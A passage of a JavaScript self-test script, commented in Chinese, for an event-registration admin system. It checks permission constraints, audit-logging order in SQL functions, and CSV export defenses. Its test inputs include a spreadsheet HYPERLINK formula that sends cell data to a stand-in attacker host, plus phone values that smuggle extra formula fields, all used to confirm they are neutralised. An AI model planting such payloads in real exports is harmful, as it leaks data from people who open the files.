  /and\s+v\.on_roster/i.test(exec0021),
);
// 反面對照：偵測器本身要抓得到「多寫一次」。
check(
  "反面對照：偵測器對一段有兩個 'paid' 的 SQL 會數到 2",
  (`select 1 where a = 'paid'; select 2 where b = 'paid';`.match(/'paid'/g) ?? []).length,
  2,
);

// =============================================================================
// [6] 第九種 staff 權限
// =============================================================================
console.log("\n[6] event.roster.read");

checkTrue(
  "0021 放寬 staff_permissions 的 CHECK",
  /drop constraint if exists staff_permissions_permission_check/.test(exec0021) &&
    /add constraint\s+staff_permissions_permission_check/.test(exec0021),
);
checkTrue("CHECK 收了 event.roster.read", /'event\.roster\.read'/.test(exec0021));
for (const p of [
  "approve_products",
  "approve_purchases",
  "approve_price_changes",
  "approve_vendors",
  "approve_combo_sets",
  "approve_stock_adjustments",
  "approve_inventory_adjustments",
  "inv.vendor.pii.read",
]) {
  checkTrue(`CHECK 沒有弄丟 '${p}'`, exec0021.includes(`'${p}'`));
}

const authTs = readFile(join(ROOT, "src/server/auth.ts"));
checkTrue("反空殼：auth.ts 讀得到", authTs.length > 3000);
checkTrue(
  "auth.ts 的 STAFF_PERMISSIONS 也有（兩邊逐字對齊）",
  /"event\.roster\.read"/.test(authTs),
);
// 兩邊的數量必須一樣：CHECK 是真正的值域，auth.ts 是鏡射。
const checkBlock = exec0021.slice(
  exec0021.indexOf("add constraint staff_permissions_permission_check"),
);
const permsInCheck = (checkBlock.slice(0, checkBlock.indexOf("));")).match(/'[a-z_.]+'/g) ?? [])
  .length;
const permsBlock = authTs.slice(
  authTs.indexOf("export const STAFF_PERMISSIONS = ["),
  authTs.indexOf("] as const;", authTs.indexOf("export const STAFF_PERMISSIONS = [")),
);
const permsInTs = (permsBlock.match(/"[a-z_.]+"/g) ?? []).length;
check("反空殼：CHECK 裡數得出權限", permsInCheck > 0, true);
check("CHECK 與 auth.ts 的權限數一致", permsInTs, permsInCheck);
check("而且是九種", permsInCheck, 9);

// =============================================================================
// [7] 兩支明文函式：先寫紀錄，再取值
// =============================================================================
console.log("\n[7] 明文出口一定留痕");

// ⚠️ 切的是**整段宣告**（create … 到 comment on function 為止），不是 $$ 之間的
//    body。security definer / set search_path 這兩句在 `as $$` 之前，只切 body 的話
//    下面兩條會永遠失敗 —— 這支測試第一次跑就是這樣紅的。
const reveal = exec0021.slice(
  exec0021.indexOf("create or replace function public.reveal_registration_contact"),
  exec0021.indexOf("comment on function public.reveal_registration_contact"),
);
const exportBody = exec0021.slice(
  exec0021.indexOf("create or replace function public.export_event_roster"),
  exec0021.indexOf("comment on function public.export_event_roster"),
);

checkTrue(
  "反空殼：切得出 reveal_registration_contact 的函式體",
  reveal.length > 400,
  `實際 ${reveal.length} 字`,
);
checkTrue(
  "反空殼：切得出 export_event_roster 的函式體",
  exportBody.length > 600,
  `實際 ${exportBody.length} 字`,
);

for (const [name, body] of [
  ["reveal_registration_contact", reveal],
  ["export_event_roster", exportBody],
]) {
  checkTrue(`${name} 是 security definer`, /security definer/.test(body));
  checkTrue(`${name} 有 set search_path`, /set search_path = public, inv/.test(body));
  checkTrue(`${name} 會呼叫 pii_log_access`, /public\.pii_log_access\(/.test(body));
  checkTrue(`${name} 沒有 actor 就 raise`, /RAISE EXCEPTION 'ROSTER_[A-Z_]*NO_ACTOR/.test(body));
}

// ⚠️ **這一條是任務書逐字要求的：pii_log_access 必須排在取值的 select 之前。**
//    在同一個交易裡順序其實不影響結果（0019 §4.1 論證過），寫在前面是為了讓
//    「這一支一定會 log」變成讀第一眼就看得出來的事 —— 而那件事需要一條測試守著，
//    否則下一個人重排一下就沒了。
const logIdx = exportBody.indexOf("public.pii_log_access(");
const valueSelectIdx = exportBody.indexOf("FROM public.admin_event_roster");
check("反空殼：export 的函式體裡找得到 pii_log_access", logIdx > 0, true);
check("反空殼：export 的函式體裡找得到取值的 select", valueSelectIdx > 0, true);
checkTrue(
  "export_event_roster：pii_log_access 排在取名單的 select 之前",
  logIdx > 0 && valueSelectIdx > 0 && logIdx < valueSelectIdx,
  `log 在 ${logIdx}，select 在 ${valueSelectIdx}`,
);
// 反面對照：把偵測器餵一段順序反過來的程式碼，它必須抓得到。
{
  const bad = "SELECT x FROM public.admin_event_roster; v := public.pii_log_access(1);";
  const l = bad.indexOf("public.pii_log_access(");
  const s = bad.indexOf("FROM public.admin_event_roster");
  check("反面對照：順序反過來時偵測器會抓到", l < s, false);
}

// subject 的分工：單列是 registrations，整場是 sessions（0021 §0.1）。
checkTrue(
  "reveal 的 subject_table 是 public.event_registrations",
  /'public\.event_registrations'/.test(reveal),
);
checkTrue(
  "export 的 subject_table 是 public.event_sessions（一次匯出＝一列紀錄）",
  /'public\.event_sessions'/.test(exportBody),
);
check(
  "export 不是每位參加者記一筆",
  (exportBody.match(/pii_log_access\(/g) ?? []).length,
  1,
  "拆成每人一筆會讓「有人一次帶走整場名單」在稽核畫面上看不見",
);
checkTrue("reveal 記下的 fields 是實際送出去的兩欄", /array\['email', 'phone'\]/.test(reveal));
checkTrue(
  "export 記下的 fields 是實際送出去的三欄",
  /array\['name', 'email', 'phone'\]/.test(exportBody),
);
// subject_label 抄一份下來：紀錄不能依賴另一張表還活著（0019 §1.2）。
checkTrue("reveal 把姓名抄進 subject_label", /v_reg\.name/.test(reveal));
checkTrue("export 把場次標題抄進 subject_label", /v_session\.title ->> 'zh'/.test(exportBody));

// 權限：兩支都要先 revoke 再 grant（0021 §7）。
for (const sig of [
  "public.reveal_registration_contact(uuid, text, uuid, text)",
  "public.export_event_roster(uuid, text, uuid, text)",
]) {
  checkTrue(`${sig} 在 revoke/grant 的清單裡`, exec0021.includes(`'${sig}'`));
}
checkTrue(
  "revoke 的形狀是 public → anon/authenticated → service_role",
  /revoke execute on function %s from public[\s\S]{0,200}?revoke execute on function %s from anon, authenticated[\s\S]{0,200}?grant\s+execute on function %s to service_role/.test(
    exec0021,
  ),
);

// =============================================================================
// [8] CSV 的三條紀律 —— 直接跑 production 那一份
// =============================================================================
console.log("\n[8] CSV（import src/lib/csv.ts 本人）");

let csvMod = null;
let rosterCsvMod = null;
try {
  csvMod = await import(pathToFileURL(join(ROOT, "src/lib/csv.ts")).href);
  rosterCsvMod = await import(pathToFileURL(join(ROOT, "src/lib/admin/roster-csv.ts")).href);
} catch (err) {
  console.log(red(`  ✗ 無法 import src/lib/csv.ts：${String(err).slice(0, 200)}`));
  console.log(red("      需要 Node ≥ 22.18（原生 TypeScript type stripping）。CI 用的是 24。"));
  fail += 1;
}

if (csvMod) {
  const { csvCell, toCsv } = csvMod;

  // ── 紀律 1：CSV injection ────────────────────────────────────────────────
  check('csvCell("=1+1")', csvCell("=1+1"), "'=1+1");
  check('csvCell("+886912345678")', csvCell("+886912345678"), "'+886912345678");
  check('csvCell("-1")', csvCell("-1"), "'-1");
  check('csvCell("@here")', csvCell("@here"), "'@here");
  check("csvCell 對 tab 開頭", csvCell("\tx"), "'\tx");
  check("csvCell 對 CR 開頭", csvCell("\rx"), '"\'\rx"');
  check(
    "真正的攻擊字串會被中和",
    csvCell('=HYPERLINK("http://evil.example?"&A1,"點我")'),
    '"\'=HYPERLINK(""http://evil.example?""&A1,""點我"")"',
  );
  // 反面對照：正常的姓名不可以被加上單引號（加了就每一格都多一撇）。
  check("正常姓名不動它", csvCell("王小明"), "王小明");
  check("空值是空字串", csvCell(null), "");
  check("undefined 也是空字串", csvCell(undefined), "");

  // 逗號、引號、換行要包起來。
  check("含逗號要包引號", csvCell("台北市,大安區"), '"台北市,大安區"');
  check("含引號要 escape 成兩個", csvCell('他說"好"'), '"他說""好"""');
  check("含換行要包引號", csvCell("第一行\n第二行"), '"第一行\n第二行"');

  // ── 紀律 2：forceText，而且**不可以**同時加單引號 ──────────────────────
  //
  // ⚠️ forceText 的輸出一定含有引號，所以它一定會再走一次 CSV 引號包裝：
  //    `="0912345678"` → `"=""0912345678"""`。第一版**跳過了那一步**（直接
  //    return），那個 bug 見下面「欄位切不開」那一段。
  check(
    'forceText 包成 ="…" 並且整格再被 CSV 引號包住',
    csvCell("0912345678", { forceText: true }),
    '"=""0912345678"""',
  );
  check(
    "forceText 保留開頭的 0",
    csvCell("0912345678", { forceText: true }).includes("0912"),
    true,
  );
  check(
    "訂單編號 forceText",
    csvCell("IB-202600000001", { forceText: true }),
    '"=""IB-202600000001"""',
  );
  // ⚠️ 快樂手 csv.ts:30-33 特別註解過的那個坑：兩個一起用，單引號會在儲存格裡
  //    看得見。這一條就是守著它。
  check(
    "forceText 不會再加公式前綴的單引號",
    csvCell("=1+1", { forceText: true }),
    '"=""=1+1"""',
    '兩個一起用會變成 ="\'=1+1"，那個單引號在儲存格裡看得見',
  );
  check(
    "forceText 的內容有引號時 escape 成兩個",
    csvCell('a"b', { forceText: true }),
    '"=""a""""b"""',
  );

  // ── 紀律 2b：forceText 的欄位切不開 ────────────────────────────────────
  //
  // ⚠️ **這一段是補洞的。** 第一版的 forceText 分支直接 `return`，沒有走引號包裝，
  //    於是值裡的 `,` 或 CRLF 會把欄位／整列切開 —— 而切開後的下一格以 `=` 開頭，
  //    公式照樣執行。也就是「擋公式」這條紀律在**唯一一個使用者真的控制得了的
  //    forceText 欄位（電話）**上完全失效。
  //
  //    當初沒抓到，是因為 CSV 段一個「值含 , 或 CRLF」的 case 都沒有。所以這裡
  //    補的不只是斷言，是那一類輸入。
  checkTrue(
    "forceText 含逗號時整格被引號包住",
    csvCell("0900000000,=1+1", { forceText: true }).startsWith('"') &&
      csvCell("0900000000,=1+1", { forceText: true }).endsWith('"'),
  );
  checkTrue(
    "forceText 含 CRLF 時整格被引號包住",
    csvCell("0900000000\r\n=1+1", { forceText: true }).startsWith('"'),
  );

  // ── 紀律 3：BOM 與 CRLF ────────────────────────────────────────────────
  const csv = toCsv(
    [{ a: "王小明", b: "0912345678" }],
    [
      { header: "姓名", value: (r) => r.a },
      { header: "電話", value: (r) => r.b, forceText: true },
    ],
  );
  check("toCsv 開頭是 BOM", csv.charCodeAt(0), 0xfeff);
  checkTrue("toCsv 用 CRLF 換行", csv.includes("\r\n"));
  check("toCsv 沒有裸 LF", /[^\r]\n/.test(csv), false, "Excel 對純 LF 的相容性不穩");
  checkTrue("toCsv 第一行是表頭", csv.startsWith("﻿姓名,電話\r\n"));
  checkTrue("toCsv 以換行收尾", csv.endsWith("\r\n"));
  check("toCsv 空列時只有表頭", toCsv([], [{ header: "姓名", value: (r) => r }]), "﻿姓名\r\n");
}

// =============================================================================
// [9] 簽到表的欄位定義
// =============================================================================
console.log("\n[9] roster-csv 的欄位");

if (rosterCsvMod) {
  const { ROSTER_CSV_COLUMNS, rosterFilename } = rosterCsvMod;
  const headers = ROSTER_CSV_COLUMNS.map((c) => c.header);
  checkTrue("反空殼：欄位不是空的", ROSTER_CSV_COLUMNS.length >= 5);
  checkTrue("有姓名欄", headers.includes("姓名"));
  checkTrue("有電話欄", headers.includes("電話"));
  checkTrue("有 Email 欄", headers.includes("Email"));
  checkTrue("有訂單編號欄", headers.includes("訂單編號"));

  const byHeader = new Map(ROSTER_CSV_COLUMNS.map((c) => [c.header, c]));
  check("電話是 forceText", byHeader.get("電話")?.forceText, true);
  check("訂單編號是 forceText", byHeader.get("訂單編號")?.forceText, true);
  // ⚠️ 姓名**不可以**是 forceText：它需要的是公式前綴那一層防護，而兩個只能擇一。
  check("姓名不是 forceText", byHeader.get("姓名")?.forceText ?? false, false);
  check("Email 不是 forceText", byHeader.get("Email")?.forceText ?? false, false);

  // 整份 CSV 走一次，確認惡意姓名真的被中和。
  if (csvMod) {
    const line = csvMod.toCsv(
      [
        {
          registration_id: "x",
          seat_no: 1,
          name: '=HYPERLINK("http://evil.example","點我")',
          email: "a@example.invalid",
          phone: "0912345678",
          notice_ack_at: null,
          order_no: "IB-202600000001",
          paid_at: "2026-09-12T01:00:00Z",
          created_at: "2026-09-12T01:00:00Z",
        },
      ],
      ROSTER_CSV_COLUMNS,
    );
    checkTrue("端到端：惡意姓名在輸出裡被前置單引號", line.includes(`"'=HYPERLINK(`));
    checkTrue("端到端：電話保留開頭的 0", line.includes("0912345678"));
    checkTrue("端到端：訂單編號強制文字", line.includes("IB-202600000001"));
    check("端到端：沒有裸的 =HYPERLINK", /,=HYPERLINK/.test(line), false);

    // ── 端到端：用嚴格的 RFC 4180 解析器回頭讀自己的輸出 ────────────────
    //
    // ⚠️ **這一段才是真正守住 CSV injection 的東西**，前面那些 includes() 只看得到
    //    「字串裡有沒有出現某個片段」。injection 的本質是**欄位邊界被切開**，而
    //    那件事只有真的解析一次才看得見 —— 第一版的 bug 就是這樣溜過去的：
    //    `="0900000000,=1+1"` 這個字串裡確實含有 `0900000000`，includes() 全綠，
    //    但解析出來是 8 欄而不是 7 欄，第 4 格是 `=1+1"`。
    //
    // 解析器刻意寫成嚴格版：引號只有在**欄位的第一個字元**才是包裝符。Excel 就是
    //    這樣做的，而寬鬆的解析器會把上面那個 bug 讀成「一切正常」。
    const parseCsv = (text) => {
      const rows = [];
      let row = [];
      let cur = "";
      let i = 0;
      let quoted = false;
      let atFieldStart = true;
      while (i < text.length) {
        const ch = text[i];
        if (atFieldStart && ch === '"') {
          quoted = true;
          atFieldStart = false;
          i += 1;
          continue;
        }
        atFieldStart = false;
        if (quoted) {
          if (ch === '"') {
            if (text[i + 1] === '"') {
              cur += '"';
              i += 2;
              continue;
            }
            quoted = false;
            i += 1;
            continue;
          }
          cur += ch;
          i += 1;
          continue;
        }
        if (ch === ",") {
          row.push(cur);
          cur = "";
          atFieldStart = true;
          i += 1;
          continue;
        }
        if (ch === "\r" && text[i + 1] === "\n") {
          row.push(cur);
          rows.push(row);
          row = [];
          cur = "";
          atFieldStart = true;
          i += 2;
          continue;
        }
        cur += ch;
        i += 1;
      }
      if (cur !== "" || row.length > 0) {
        row.push(cur);
        rows.push(row);
      }
      return rows;
    };

    // 四種輸入，每一種都要解析成「2 列、每列欄位數 = 欄位定義數」。
    // 電話那三種是使用者真的送得進來的東西：server 端目前對
    // participants[].phone 只有 .max(30)，沒有格式驗證。
    const mkRow = (phone, name) => ({
      registration_id: "x",
      seat_no: 1,
      name,
      email: "a@example.invalid",
      phone,
      notice_ack_at: null,
      order_no: "IB-202600000001",
      paid_at: "2026-09-12T01:00:00Z",
      created_at: "2026-09-12T01:00:00Z",
    });
    const cases = [
      ["乾淨的一列", "0900000000", "王小明"],
      ["電話含逗號", "0900000000,=1+1", "王小明"],
      ["電話含 CRLF", "0900000000\r\n=1+1", "王小明"],
      ["電話含引號", '0900000000"=1+1', "王小明"],
      ["姓名是公式", "0900000000", '=HYPERLINK("http://evil.example","點我")'],
      ["姓名含逗號與引號", "0900000000", '王,小"明'],
    ];
    const width = ROSTER_CSV_COLUMNS.length;
    for (const [label, phone, name] of cases) {
      const rows = parseCsv(csvMod.toCsv([mkRow(phone, name)], ROSTER_CSV_COLUMNS));
      check(`欄位切不開（${label}）：解析出 2 列`, rows.length, 2);
      check(
        `欄位切不開（${label}）：每列都是 ${width} 欄`,
        rows.map((r) => r.length),
        [width, width],
      );
      // 解析出來的每一格，開頭都不可以是會被 Excel 當公式的字元 —— forceText 那
      // 兩格例外，它們的 `="…"` 是**刻意**的公式，而且整串都在同一格裡。
      const dangerous = rows
        .flat()
        .filter((f) => /^[=+@\t\r-]/.test(f))
        .filter((f) => !/^="[^]*"$/.test(f));
      check(`欄位切不開（${label}）：沒有意外的公式格`, dangerous, []);
    }
    // 反面對照：把「舊的、有 bug 的」forceText 寫法餵給同一組斷言，它必須抓得到。
    // 少了這一條，上面六組全過有可能是因為解析器或斷言自己壞掉。
    {
      const brokenCell = (v, o = {}) =>
        o.forceText ? `="${String(v).replace(/"/g, '""')}"` : csvMod.csvCell(v, o);
      const brokenCsv =
        "﻿" +
        [
          ROSTER_CSV_COLUMNS.map((c) => brokenCell(c.header)).join(","),
          ROSTER_CSV_COLUMNS.map((c) =>
            brokenCell(c.value(mkRow("0900000000,=1+1", "王小明")), { forceText: c.forceText }),
          ).join(","),
        ].join("\r\n") +
        "\r\n";
      const brokenRows = parseCsv(brokenCsv);
      check(
        "反面對照：舊的 forceText 寫法會被抓到欄位數不符",
        brokenRows.map((r) => r.length),
        [width, width + 1],
      );
      checkTrue(
        "反面對照：而且切出一格以 = 開頭的公式",
        brokenRows.flat().some((f) => f === '=1+1"'),
      );
    }
  }

  // 檔名。
  const name = rosterFilename("春日書桌讀書會", "2026-09-12T01:00:00Z");
  check("檔名有日期（台北時區）", name, "小時光報名名單_春日書桌讀書會_20260912.csv");
  checkTrue(
    "檔名拿掉不合法的半形字元",
    !/[\\/:*?"<>|]/.test(rosterFilename('a/b:c*d?e"f<g>h|i', "2026-09-12T01:00:00Z").slice(0, -4)),
  );
  checkTrue("沒有日期時不會產出空檔名", rosterFilename("", null).endsWith("_無日期.csv"));
  // ⚠️ 台北時區：UTC 的 2026-09-11T17:00Z 是台北的 9/12 凌晨 1 點。用 server 的
  //    本地時間（Vercel 是 UTC）會讓檔名差一天。
  check(
    "跨日的場次用台北日期",
    rosterFilename("x", "2026-09-11T17:00:00Z"),
    "小時光報名名單_x_20260912.csv",
  );
}

// =============================================================================
// [10] TypeScript 那一側的不變量
// =============================================================================
console.log("\n[10] repo / fn / 畫面");

const regRepoTs = readFile(join(ROOT, "src/server/repos/event-registrations.ts"));
const regFnTs = readFile(join(ROOT, "src/lib/admin/fns/event-registrations.ts"));
const routeTs = readFile(join(ROOT, "src/routes/admin/_shell.registrations.tsx"));
// 2026-10-25 後台第 2 批：名單從列表的彈窗改成內頁 /admin/registrations/$sessionId。
// 名單頁本體（標題、匯出、log_id）在 SessionRosterPage.tsx、表格在 SessionRosterTable.tsx、
// 權限判斷在 route 檔。下面「畫面」那幾條守的不變量不變，只是換到新位置讀。
const rosterPageTs = readFile(join(ROOT, "src/components/admin/SessionRosterPage.tsx"));
const rosterTableTs = readFile(join(ROOT, "src/components/admin/SessionRosterTable.tsx"));
const rosterRouteTs = readFile(
  join(ROOT, "src/routes/admin/_shell.registrations_.$sessionId.index.tsx"),
);
const csvTs = readFile(join(ROOT, "src/lib/csv.ts"));
const rosterCsvTs = readFile(join(ROOT, "src/lib/admin/roster-csv.ts"));

checkTrue(
  // 2026-10-25：RegistrationRevealDialog.tsx 已刪（名單直接顯示明文）。
  "反空殼：四個新／改的檔案都讀得到",
  regRepoTs.length > 3000 &&
    regFnTs.length > 2000 &&
    routeTs.length > 5000 &&
    rosterPageTs.length > 3000 &&
    rosterTableTs.length > 3000 &&
    csvTs.length > 1000 &&
    rosterCsvTs.length > 1000,
);

// ── Phase 1 的 TS 遮罩已經整段刪掉 ────────────────────────────────────────
// 0020 的 repo 檔頭寫明「Phase 2 會建 view 並把這裡換掉」。這一條守著那件事真的
// 發生了 —— 兩份遮罩實作同時存在的期間只有一期。
check("repo 裡沒有 TypeScript 的 maskTail", /function maskTail/.test(regRepoTs), false);
check("repo 裡沒有 TypeScript 的 maskEmail", /function maskEmail/.test(regRepoTs), false);
check("repo 裡沒有 repeat 星號的遮罩邏輯", /"\*"\.repeat\(/.test(regRepoTs), false);
checkTrue("repo 改讀 admin_event_roster", /from\("admin_event_roster"\)/.test(regRepoTs));
// 2026-10-25（業主）：名單頁與店家通知信改顯示明文；2026-10-26 名單頁與 CSV 匯出不再寫
// 查看紀錄。直接讀本表的地方剛好三處：listSessionRoster()（名單頁）、loadRosterExport()
// （CSV）與 loadOrderAttendeesForAdminNotify()（店家通知信）。多出第四處就是多一條沒人
// 審過的明文路徑。
{
  const code = stripTs(regRepoTs);
  check(
    "repo 直接讀 event_registrations 的地方剛好三處",
    (code.match(/from\("event_registrations"\)/g) ?? []).length,
    3,
  );
  const fnOf = (name) => {
    const at = code.indexOf(`export async function ${name}(`);
    if (at < 0) return "";
    const end = code.indexOf("\nexport ", at + 10);
    return end < 0 ? code.slice(at) : code.slice(at, end);
  };
  for (const n of ["listSessionRoster", "loadRosterExport", "loadOrderAttendeesForAdminNotify"]) {
    checkTrue(`其中一處在 ${n}`, fnOf(n).includes('from("event_registrations")'));
  }
  for (const n of ["listSessionRoster", "loadRosterExport"]) {
    checkTrue(
      `🔴 ${n} 不寫 pii_access_log（業主 2026-10-26）`,
      !/pii_log_access|\.rpc\(/.test(fnOf(n)),
    );
  }
}
// COLUMNS 常數裡不可以有裸的 email / phone。
const columnsLine = (regRepoTs.match(/const ROSTER_COLUMNS =[\s\S]*?;/) ?? [""])[0];
checkTrue("反空殼：切得出 ROSTER_COLUMNS", columnsLine.length > 100);
check(
  "COLUMNS 沒有裸 email",
  /\bemail\b(?!_masked)/.test(columnsLine.replace("has_email", "")),
  false,
);
check(
  "COLUMNS 沒有裸 phone",
  /\bphone\b(?!_masked)/.test(columnsLine.replace("has_phone", "")),
  false,
);

// ── 2026-10-26：repo 不再呼叫任何 RPC ────────────────────────────────────
// reveal_registration_contact()／export_event_roster() 仍在資料庫裡（沒有 drop），只是
// 沒人呼叫；接回來就又會每匯出一次寫一筆紀錄。
check("repo 沒有 revealRegistrationContact", /revealRegistrationContact/.test(regRepoTs), false);
check("repo 沒有 exportEventRoster", /exportEventRoster/.test(regRepoTs), false);
check(
  "repo 沒有任何 rpc 呼叫（名單／匯出都不寫紀錄）",
  (stripTs(regRepoTs).match(/\.rpc\(/g) ?? []).length,
  0,
);
checkTrue("repo 有 loadRosterExport", /export async function loadRosterExport\(/.test(regRepoTs));
// 報名資料只由 SQL 函式寫（0020 §2 的不變量在這一期照樣成立）。
check("repo 沒有 insert", /\.insert\(/.test(regRepoTs), false);
check("repo 沒有 delete", /\.delete\(/.test(regRepoTs), false);
check("repo 沒有 update", /\.update\(/.test(regRepoTs), false);

// ── loadPaidRoster：Phase 3 要用的那一支 ─────────────────────────────────
checkTrue("repo 有 loadPaidRoster", /export async function loadPaidRoster/.test(regRepoTs));
checkTrue("loadPaidRoster 用 on_roster 過濾", /\.eq\("on_roster", true\)/.test(regRepoTs));
check(
  // queryPaidRoster（簽到表／提醒信）與 loadRosterExport（CSV）——條件都是 view 的 on_roster。
  "過濾 on_roster 的查詢剛好兩支（簽到表、CSV），都用 view 的 on_roster",
  (stripTs(regRepoTs).match(/\.eq\("on_roster", true\)/g) ?? []).length,
  2,
);
checkTrue(
  "countRegistrationsBySession 也讀 on_roster（不是自己再判斷一次付款狀態）",
  /select\("session_id, on_roster"\)/.test(regRepoTs),
);

// ── 「誰在簽到表上」在整個 src/ 裡只定義一次 ──────────────────────────────
// ⚠️ 這一條是給 Phase 3 的。提醒信如果自己寫一次 `payment_status === "paid"`，
//    就會出現「有人收到提醒卻不在簽到表上」（快樂手 queries.ts:117-125 的原話）。
//    規則：**任何提到 event_registrations 或 admin_event_roster 的檔案，都不可以
//    出現 "paid" 這個字面值。** 要判斷就用 on_roster。
const rosterTouchers = [];
for (const f of walkSrc()) {
  const src = stripTs(readFile(f));
  if (!/event_registrations|admin_event_roster/.test(src)) continue;
  rosterTouchers.push(relative(ROOT, f));
  check(
    `${relative(ROOT, f)} 沒有自己寫一次 "paid"`,
    /["']paid["']/.test(src),
    false,
    "改用 on_roster —— 那個條件只定義在 0021 §3 的 view 裡",
  );
}
checkTrue("反空殼：真的掃到碰名單的檔案", rosterTouchers.length >= 1, rosterTouchers.join(", "));
// 反面對照：偵測器要抓得到一段確定違規的程式碼。
check(
  '反面對照：偵測器對 payment_status === "paid" 會命中',
  /["']paid["']/.test('if (row.payment_status === "paid") {}'),
  true,
);

// ── server fn 那一層 ─────────────────────────────────────────────────────
checkTrue(
  // 2026-10-26：revealRegistrationContact 已移除；exportSessionRoster 多掛只讀標記。
  "三支既有 fn 都掛 staffFnMiddleware()（匯出那支另加 readOnlyFnMiddleware）",
  (regFnTs.match(/\.middleware\(\[staffFnMiddleware\(\)\]\)/g) ?? []).length === 2 &&
    /exportSessionRoster = createServerFn\(\{ method: "POST" \}\)\s*\.middleware\(\[staffFnMiddleware\(\), readOnlyFnMiddleware\]\)/.test(
      regFnTs,
    ),
);
// ⚠️ 0035 加了第五支 fn（deleteAdminRegistration），刻意掛 adminFnMiddleware 不是
// staffFnMiddleware()——移除是會永久改變資料的動作，授權層級與上面四支「查看」不
// 同（見 fns/event-registrations.ts 檔頭「為什麼 deleteAdminRegistration 掛
// adminFnMiddleware」那一段）。這裡把「掛載數＝匯出數」的比對改成同時算兩種
// middleware（同檔案 sessions 那一段本來就是這樣比對的，見 event-registration-
// selftest.mjs 的對應斷言），並且明著釘住「剛好 1 支是 adminFnMiddleware」，
// 這樣既有的四支被誤改成別的 middleware，或這一支被誤改回 staffFnMiddleware()，
// 兩種方向都會轉紅。
check(
  "middleware 的掛載數 = 匯出的 server fn 數（staffFnMiddleware() ＋ adminFnMiddleware 一起算）",
  (
    regFnTs.match(
      /\.middleware\(\[(staffFnMiddleware\(\)(, readOnlyFnMiddleware)?|adminFnMiddleware)\]\)/g,
    ) ?? []
  ).length,
  (regFnTs.match(/export const \w+ = createServerFn/g) ?? []).length,
);
check(
  "剛好 1 支掛 adminFnMiddleware（0035 的 deleteAdminRegistration）",
  (regFnTs.match(/\.middleware\(\[adminFnMiddleware\]\)/g) ?? []).length,
  1,
);
check(
  "三支既有 fn 都檢查 event.roster.read（移除那支不需要——admin 已經是最高權限）",
  (stripTs(regFnTs).match(/requireRosterRead\(context\.staff\.permissions\)/g) ?? []).length,
  3,
);
checkTrue(
  "deleteAdminRegistration 沒有呼叫 requireRosterRead（adminFnMiddleware 已經是完整授權）",
  !/deleteAdminRegistration[\s\S]*?requireRosterRead/.test(stripTs(regFnTs)),
);
checkTrue(
  "權限從 context 重讀，不是前端送的",
  /context\.staff\.permissions/.test(regFnTs) && !/data\.permissions/.test(stripTs(regFnTs)),
);
// ⚠️ 事由由動作決定，不由前端送（0021 §1）。
check("fn 的 inputValidator 沒有 reason 欄位", /reason:/.test(stripTs(regFnTs)), false);
check("repo 不再送任何 p_reason（不寫紀錄）", /p_reason:/.test(stripTs(regRepoTs)), false);

// ── CSV 是 server fn，不是 HTTP 路由 ─────────────────────────────────────
console.log("\n[11] CSV 不是 HTTP 路由");

const serverTs = readFile(join(ROOT, "src/server.ts"));
checkTrue("反空殼：src/server.ts 讀得到", serverTs.length > 1000);
check("src/server.ts 沒有 roster/csv 路徑", /roster|\.csv/i.test(stripTs(serverTs)), false);
check(
  "routes 底下沒有 .csv 檔案路由",
  walkSrc(join(ROOT, "src/routes")).some((f) => /csv/i.test(f)),
  false,
);
checkTrue(
  "匯出的 fn 回的是字串與檔名，不是 Response",
  /csv: toCsv\(/.test(regFnTs) && /filename: rosterFilename\(/.test(regFnTs),
);
check("匯出的 fn 沒有 new Response", /new Response\(/.test(regFnTs), false);
check("匯出的 fn 沒有 Content-Disposition", /Content-Disposition/i.test(regFnTs), false);
// 前端用 Blob 下載。
checkTrue(
  "畫面用 Blob + a.download 下載",
  /new Blob\(\[csv\]/.test(rosterPageTs) && /a\.download = filename/.test(rosterPageTs),
);
check(
  "Blob 沒有再加一次 BOM",
  /\\uFEFF|﻿"/.test(
    rosterPageTs.slice(rosterPageTs.indexOf("new Blob"), rosterPageTs.indexOf("new Blob") + 200),
  ),
  false,
);
checkTrue(
  "下載後有 revokeObjectURL（不留著 blob URL）",
  /URL\.revokeObjectURL\(url\)/.test(rosterPageTs),
);

// ── 畫面 ─────────────────────────────────────────────────────────────────
console.log("\n[12] 畫面");

// 0021 未套用時不可以整頁爆掉（沿用 Phase 1 在 loader 做的那個形狀）。
// 2026-10-25 起這段退化邏輯隨整頁資料搬到伺服器（getAdminRegistrationsPageData），
// route 的 loader 只剩呼叫那一支 fn。
const regFnsTs = stripTs(readFile(join(ROOT, "src/lib/admin/fns/event-sessions.ts")));
const regPageFn = regFnsTs.slice(regFnsTs.indexOf("export const getAdminRegistrationsPageData"));
checkTrue(
  "loader 經由整頁 fn 取資料",
  /getAdminRegistrationsPageData\(\)/.test(routeTs) && regPageFn.length > 0,
);
checkTrue("loader 認得「表／view 不存在」", /PGRST205\|42P01/.test(regFnsTs));
checkTrue(
  "整頁 fn 的權限與原本 4 支一樣（staffFnMiddleware ＋ requireRosterRead）",
  /\.middleware\(\[staffFnMiddleware\(\)\]\)[\s\S]{0,120}await requireRosterRead\(context\.staff\.permissions\)/.test(
    regPageFn,
  ),
);
checkTrue(
  "0020 與 0021 是兩個旗標（0021 沒套時場次照樣維護得動）",
  /schemaMissing/.test(routeTs) && /rosterReady/.test(routeTs),
);
// 2026-10-20：0020／0021 早已套用到正式庫，畫面上「migration 尚未套用」的兩段工程說明
// 已拿掉（店長看不懂、也永遠不會再出現）。旗標與退化邏輯照舊保留（上一條）。
checkTrue(
  "畫面上不再有「migration 尚未套用」的工程說明",
  !/尚未套用到資料庫/.test(stripTs(routeTs)) && !/這一頁要等 migration/.test(stripTs(routeTs)),
);
check(
  // 0036：從 2 次變 3 次——loader 多了一段「方案表還沒套 migration 就退化」的
  // try/catch（listEventSessionPlans()），跟既有兩段（sessions/products 那組、
  // countRegistrationsBySession 那段）用的是同一個 isSchemaMissing() 判斷式，
  // 不是新發明一種吞法。
  "loader 只吞「不存在」這一種錯誤，其餘往上丟",
  // 2026-10-25：搬到伺服器後是三個判斷點（場次／商品那組、方案、報名人數），每個都是
  // 「不是表不存在 → 照丟」。
  (regPageFn.match(/!isSchemaMissingError\([^)]*\)\) throw [\w.]+;/g) ?? []).length,
  3,
);
// 三個數字的差額要顯示出來（0020 §4.4 回填的舊場次只補一位參加者）。
checkTrue("列表顯示「另有 N 位未登錄姓名」", /另有 \{unnamed\} 位未登錄姓名/.test(routeTs));
checkTrue("差額是 seats_taken - total", /s\.seats_taken - count\.total/.test(routeTs));
// 名單直接顯示明文（業主 2026-10-25），單筆揭露對話框已拿掉。
checkTrue(
